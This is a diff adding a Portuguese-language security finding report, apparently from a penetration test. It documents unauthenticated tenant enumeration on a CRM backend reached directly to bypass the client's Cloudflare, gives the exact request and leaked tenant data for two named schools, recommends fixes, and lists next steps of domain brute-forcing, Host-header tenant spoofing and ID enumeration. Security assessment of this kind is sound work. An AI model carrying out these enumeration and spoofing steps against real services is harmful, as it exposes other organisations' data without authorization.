@@ -1,0 +1,69 @@
+# F-003 Enumeração de tenants (multi-tenant) sem autenticação
+Alvo: api-crm-h4ww.onrender.com (backend CRM, bypass CF)
+Severidade: Alta
+Timestamp: 2026-08-27T19:55Z UTC
+
+## Reprodução
+GET https://api-crm-h4ww.onrender.com/auth/user/school?domain=<DOMINIO>
+(Sem autenticação, direto no backend Render, bypass do Cloudflare do cliente)
+
+## Output
+
+### domain=degraucultural.com.br (id=1)
+{
+  "school":{
+    "id":1,
+    "name":"Degrau Cultural",
+    "domain":"degraucultural.com.br",
+    "background":"#009c73",
+    "class_theme":"theme-degrau",
+    "logo_crm":"https://files-producao.s3.us-east-2.amazonaws.com/degrau-cultural/logos/11c244624-cb8b-4223-98d7-d3ccc5a410e9.webp",
+    "logo_desktop":"...mesmo S3...",
+    "logo_mobile":"...mesmo S3..."
+  }
+}
+
+### domain=centraldeconcursos.com.br (id=2)
+{
+  "school":{
+    "id":2,
+    "name":"Central de Concursos",
+    "domain":"centraldeconcursos.com.br",
+    "background":"#031af5",
+    "class_theme":"theme-central",
+    "logo_crm":"https://files-producao.s3.us-east-2.amazonaws.com/central-de-concursos/logos/2a5613ff6-9707-4974-849f-854985a1598f.png",
+    "logo_desktop":"...mesmo S3...",
+    "logo_mobile":"...mesmo S3..."
+  }
+}
+
+### domain=seducar.com.br
+{"message":"Cliente não encontrado para o domínio informado"}
+
+## Interpretação
+- O endpoint /auth/user/school é UNAUTHENTICATED e permite enumerar TODOS os
+  tenants (escolas) da plataforma white-label Seducar.
+- Confirmados: id=1 Degrau Cultural (degraucultural.com.br), id=2 Central de
+  Concursos (centraldeconcursos.com.br).
+- "seducar.com.br" não é tenant → confirma que Seducar é a operadora white-label.
+- Cada tenant vaza: id, name, domain, cores de tema, class_theme, e URLs de
+  logos em bucket S3 (files-producao.s3.us-east-2.amazonaws.com).
+- O parâmetro `domain` aceita regex de hostname ([a-z0-9-]+\.[a-z]+) — pode ser
+  brute-forced para descobrir novos tenants.
+
+## Impacto
+- ALTO: Enumeração não-autenticada de todos os clientes da plataforma Seducar.
+- Expõe estrutura multi-tenant (IDs sequenciais → enumeração por id possível).
+- Vaza URLs de logos em S3 (bucket files-producao, região us-east-2).
+- Permite tenant spoofing (spoofar domain em outros endpoints para acessar
+  dados de outra escola — Degrau ↔ Central de Concursos cross-tenant).
+- Combina com F-A1 (backends Render vazados): enum + bypass CF sem auth.
+
+## Recomendação
+Exigir autenticação para /auth/user/school. Não expor IDs/temas/logos sem auth.
+Usar UUIDs ao invés de IDs sequenciais. Validar origem (CORS/origin header).
+
+## Próximo passo
+- Brute force de domains para descobrir novos tenants.
+- Testar tenant spoofing em endpoints autenticados (trocar domain/Host header).
+- Enumerar por school id (1,2,3,...) se houver endpoint por id.
